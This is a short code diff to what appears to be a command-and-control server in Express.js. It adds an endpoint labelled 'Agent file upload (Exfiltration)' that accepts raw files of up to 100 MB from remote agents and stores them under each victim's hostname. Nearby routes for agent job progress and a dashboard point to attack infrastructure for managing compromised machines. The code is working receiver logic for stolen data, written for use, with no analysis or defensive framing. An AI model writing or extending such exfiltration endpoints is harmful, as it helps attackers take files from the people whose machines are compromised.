@@ -324,6 +324,27 @@ app.post('/api/agent/jobs/:jobId/progress', (req, res) => {
     res.json({ success: true });
 });
 
+// Agent file upload (Exfiltration)
+app.post('/api/agent/upload/:hostname', express.raw({ type: '*/*', limit: '100mb' }), (req, res) => {
+    const hostname = req.params.hostname;
+    const filename = req.query.filename || 'uploaded_file.bin';
+    
+    const uploadDir = path.join(__dirname, 'data', 'uploads');
+    if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
+    
+    const safeFilename = filename.replace(/[^a-zA-Z0-9.\-_]/g, '_');
+    const filePath = path.join(uploadDir, `${hostname}_${Date.now()}_${safeFilename}`);
+    
+    try {
+        fs.writeFileSync(filePath, req.body);
+        console.log(`[Upload] File saved successfully to ${filePath}`);
+        res.json({ success: true, path: filePath });
+    } catch (err) {
+        console.error(`[Upload] Failed to save file:`, err);
+        res.status(500).json({ error: 'Failed to save file on server' });
+    }
+});
+
 // ==========================================
 // DASHBOARD ROUTES (Called by the web UI)
 // ==========================================
